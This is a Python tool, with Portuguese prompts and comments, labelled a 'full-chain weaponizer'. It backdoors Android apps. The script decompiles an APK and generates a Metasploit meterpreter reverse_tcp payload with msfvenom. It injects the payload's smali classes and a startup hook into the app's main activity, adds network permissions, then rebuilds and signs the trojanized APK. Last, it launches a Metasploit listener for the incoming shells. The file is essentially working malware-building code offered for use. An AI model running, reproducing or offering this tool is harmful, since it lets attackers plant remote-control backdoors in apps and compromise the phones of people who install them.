import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- CORES E ESTILO ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}FULL-CHAIN WEAPONIZER{RESET} | {WHITE}Build + Sign + Listen{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def fix_permissions(project_folder):
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    with open(manifest, "r") as f: content = f.read()
    perms = ['android.permission.INTERNET', 'android.permission.ACCESS_NETWORK_STATE', 'android.permission.WAKE_LOCK']
    needed = [f'    <uses-permission android:name="{p}"/>' for p in perms if p not in content]
    if needed:
        new_content = content.replace("</manifest>", "\n".join(needed) + "\n</manifest>")
        with open(manifest, "w") as f: f.write(new_content)
        log(f"Permissões de rede injetadas.", "success")

def iniciar_listener(ip, porta):
    """Gera um script rc e inicia o recurso de escuta do Metasploit."""
    log(f"Preparando Listener em {ip}:{porta}...", "info")
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {porta}
set EXITONSESSION false
exploit -j
    """
    with open("handler.rc", "w") as f: f.write(root_dir := rc_content)
    log("Iniciando Metasploit Multi-Handler (Aguarde o console)...", "warn")
    os.system(f"msfconsole -r handler.rc")

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} Seu IP (LHOST): ").strip()
    lport = input(f" {YELLOW}»{RESET} Sua Porta (LPORT): ").strip()
    if not lhost or not lport: return False, None, None

    log("Gerando payload e migrando classes...", "info")
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload_tmp.apk"], capture_output=True)
    subprocess.run(["apktool", "d", "payload_tmp.apk", "-o", "payload_tmp", "-f"], capture_output=True)
    
    src_smali = os.path.join("payload_tmp", "smali", "com", "metasploit")
    dst_smali = os.path.join(project_folder, "smali", "com", "metasploit")
    if os.path.exists(dst_smali): rmtree(dst_smali)
    os.makedirs(os.path.dirname(dst_smali), exist_ok=True)
    copytree(src_smali, dst_smali)

    # Injeção do Hook
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        main_activity = re.search(r'<activity [^>]*android:name="([^"]+)"', f.read()).group(1)
    
    smali_path = None
    target_file = main_activity.replace('.', '/') + ".smali"
    for root, dirs, files in os.walk(project_folder):
        if target_file in os.path.join(root, target_file):
            smali_path = os.path.join(root, target_file); break

    if smali_path:
        with open(smali_path, "r") as f: lines = f.readlines()
        new_lines, injected = [], False
        for line in lines:
            new_lines.append(line)
            if "onCreate(Landroid/os/Bundle;)V" in line: pass
            if "invoke-super" in line and not injected:
                new_lines.append(f"\n    invoke-static {{p0}}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
                injected = True
        with open(smali_path, "w") as f: f.writelines(new_lines)
        fix_permissions(project_folder)
        rmtree("payload_tmp"); os.remove("payload_tmp.apk")
        return True, lhost, lport
    return False, None, None

def build_e_assinar(out):
    final_apk = os.path.abspath(f"{out}_weaponized.apk")
    log("Recompilando e Assinando...", "info")
    subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True)
    
    ks = "debug.keystore"
    if not os.path.exists(ks):
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=W"], capture_output=True)
    
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    print(f"\n{GREEN}[SUCCESS]{RESET} APK Gerado em: {BOLD}{final_apk}{RESET}")
    return True

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile (Abrir APK)")
        print(f" [{RED}2{RESET}] GERAR SHELL + BUILD + SIGN + LISTEN")
        print(f" [{RED}3{RESET}] Listar Arquivos (ls)")
        print(f" [{RED}4{RESET}] Sair")
        
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@pentest:~# {RESET}").strip()
        
        if cmd == "3" or cmd.lower() == "ls":
            subprocess.run(["ls", "-F", "--color=auto"])
            input("\nEnter para continuar...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} Arquivo: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Projeto descompilado na pasta: {out}", "success"); time.sleep(1)
            else: log("Alvo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, porta = gerar_e_injetar_payload(out)
                if success:
                    if build_e_assinar(out):
                        print(f"\n{YELLOW}[?]{RESET} Deseja iniciar o Listener do Metasploit agora? (s/n)")
                        check = input(f" {RED}» {RESET}").lower()
                        if check == 's': iniciar_listener(ip, porta)
            else: log("Diretório inválido.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() == "exit": break

if __name__ == "__main__":
    main()
